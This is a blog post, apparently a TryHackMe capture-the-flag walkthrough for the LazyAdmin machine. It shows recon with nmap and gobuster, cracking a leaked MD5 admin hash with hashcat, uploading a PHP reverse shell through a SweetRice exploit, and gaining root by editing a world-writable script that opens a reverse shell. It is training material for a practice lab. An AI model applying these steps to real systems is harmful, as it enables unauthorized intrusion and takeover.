---
title: 'TryHackMe WriteUp | LazyAdmin'
date: '2022-06-14T20:38:54-04:00'
layout: post
author: jazzy_j
permalink: /2022/06/tryhackme-writeup-lazyadmin/
image: /assets/uploads/2022/06/lazyadmin.jpeg
tags: [lazyadmin, tryhackme, Write-Up]
---

> Description: Easy linux machine to practice your skills. Have some fun! There might be multiple ways to get user access.

**Note:** Make sure to add the IP to **/etc/hosts**

## Recon

Let's do some basic enumeration by running a nmap scan

```
┌──(root㉿kali)-[~/THM]
└─# nmap -sV -Pn -T4 -A 10.10.138.64
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 19:52 EDT
Nmap scan report for 10.10.138.64
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
<snip>
........

```

![](/assets/uploads/2022/06/2022-06-14-20_05_17-Targets.png)
It looks like there are two ports open

- port 22 (SSH)
- port 80 (HTTP)

Normally, trying to exploit SSH leads down a rabbit hole, so let’s focus on Apache.

Going to the URL of the target comes back with the default Apache page

![](/assets/uploads/2022/06/2022-06-14-20_06_15-Targets.png)
Let’s run gobuster to see if we can find any hidden directories

```
gobuster dir -u http://10.10.138.64 -w /usr/share/dirb/wordlists/common.txt
```

![](/assets/uploads/2022/06/2022-06-14-20_06_56-Targets.png)
There’s a **/content** directory so let’s run gobuster again to find anymore hidden directories

```
gobuster dir -u http://10.10.138.64/content/ -w /usr/share/dirb/wordlists/common.txt
```

We are now seeing several hidden directories that we'll want to inspect

![](/assets/uploads/2022/06/2022-06-14-20_09_28-Targets.png)
Navigating to http://10.10.138.64/content appears to be a default page and reveals that the server is running SweetRice CMS (content management system).

![](/assets/uploads/2022/06/2022-06-14-20_10_01-Targets.png)
Going to http://10.10.138.64/content/inc comes back with a list of sub-directories and files

![](/assets/uploads/2022/06/2022-06-14-20_11_20-LazyAdmin.png)
Looking at the **latest.txt** file we see that 1.51. is the version of SweetRice running:

![](/assets/uploads/2022/06/2022-06-14-20_13_10-LazyAdmin.png)
Let’s use searchsploit to look for any vulnerabilities associated with sweetrice

![](/assets/uploads/2022/06/2022-06-14-20_13_41-LazyAdmin.png)
We can see that SweetRice 1.5.1 has multiple vulnerabilities associated with it.

I’m also seeing a mysql backup file, so let’s download it and see if there’s anything in there;

```
┌──(root㉿kali)-[~/THM/LazyAdmin]
└─# cat mysql_bakup_20191129023059-1.5.1.sql

....
VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\
```

We see the admin is **manager** and we also see the password hash as well

Checking the hash with hash-identifier tells us that it’s an MD5 hash

![](/assets/uploads/2022/06/2022-06-14-20_15_17-LazyAdmin.png)
We now need to try and crack the hash, so let's use hashcat for that

```
┌──(root㉿kali)-[~/THM/LazyAdmin]
└─# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Very nice! We now have the password for the user:

![](/assets/uploads/2022/06/2022-06-14-20_17_10-LazyAdmin.png)
Navigating to <http://10.10.138.64/content/as> presents us with a login page. Trying the credentials we just obtained, we are able to login

![](/assets/uploads/2022/06/2022-06-14-20_18_33-LazyAdmin.png)
Looking around the website, I’m noticing under the **Ads** section you are able to upload code. Since we know that it’s vulnerable to Arbitrary File Uploads, let’s try it.

I came across a CSRF (cross-site request forgery) exploit on exploit-db (<https://www.exploit-db.com/exploits/40716>). It tells us that SweetRice allows the Admin to add PHP code through the **Ads** page, so use searchsploit to grab the exploit:

```
┌──(root㉿kali)-[~/THM/LazyAdmin]
└─# searchsploit -m php/webapps/40716.py
  Exploit: SweetRice 1.5.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/40716
     Path: /usr/share/exploitdb/exploits/php/webapps/40716.py
File Type: Python script, ASCII text executable

Copied to: /root/THM/LazyAdmin/40716.py
```

Let’s also use a PHP reverse shell which can be found in **/usr/share/webshells/php/php-reverse-shell.php**

Edit the IP and Port in the PHP reverse shell file to your kali IP and any port. I’m going to use 7777. Save and quit the file

Run the exploit from exploit-db

```
python3 40716.py
```

It will ask you for the target URL, username, password, and Reverse shell file. Make sure to rename the PHP reverse shell file to .php5

![](/assets/uploads/2022/06/2022-06-14-20_21_13-LazyAdmin.png)
When you hit Enter, it will tell you that the payload is now at that following URL http://10.10.138.6/content/attachment/php-reverse-shell.php5

![](/assets/uploads/2022/06/2022-06-14-20_22_28-LazyAdmin.png)
Navigating to the URL, I can see that it uploaded the payload successfully

![](/assets/uploads/2022/06/2022-06-14-20_22_54-LazyAdmin.png)
Let’s start up a netcat listener to see if we can get a reverse shell

```
nc -nvlp 7777
```

Clicking on the PHP reverse shell file that was uploaded should now create a connection to the netcat listener

![](/assets/uploads/2022/06/2022-06-14-20_23_54-LazyAdmin.png)
Now, let’s search for the user flag

```
$ find / -type f -iname user.txt 2>/dev/null
```

![](/assets/uploads/2022/06/2022-06-14-20_24_52-LazyAdmin.png)
## Privilege Escalation

We need to check to see what sudo permissions the user has

```
sudo -l
```

![](/assets/uploads/2022/06/2022-06-14-20_26_36-LazyAdmin.png)
Looks like the itguy user is able to run a perl script from his home directory. Checking out the contents of that file shows the following

```
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

![](/assets/uploads/2022/06/2022-06-14-20_27_15-LazyAdmin.png)
The script executes a bash script **/etc/copy.sh**. Let’s check that script and see what it’s doing

![](/assets/uploads/2022/06/2022-06-14-20_27_57-LazyAdmin.png)
The script seems to be sending a reverse shell to an IP address of 19.168.0.190. The script is also writeable and executable for everyone so change the IP to our Kali IP

![](/assets/uploads/2022/06/2022-06-14-20_28_36-LazyAdmin.png)

![](/assets/uploads/2022/06/2022-06-14-20_30_51-LazyAdmin.png)
Open up a new terminal window and start up a new netcat listener and run the [backup.pl](http://backup.pl/) script

![](/assets/uploads/2022/06/2022-06-14-20_31_20-LazyAdmin.png)
Checking the netcat listener, we now have a reverse shell as root

![](/assets/uploads/2022/06/2022-06-14-20_34_46-LazyAdmin.png)
Search for the root flag

```
# find / -type f -name root.txt 2>/dev/null
```

![](/assets/uploads/2022/06/2022-06-14-20_35_28-LazyAdmin.png)
And that completes the walkthrough for LazyAdmin. I hope you’ve found this walkthrough helpful and enjoyed discovering new tips and tricks along the way!

Happy Hacking!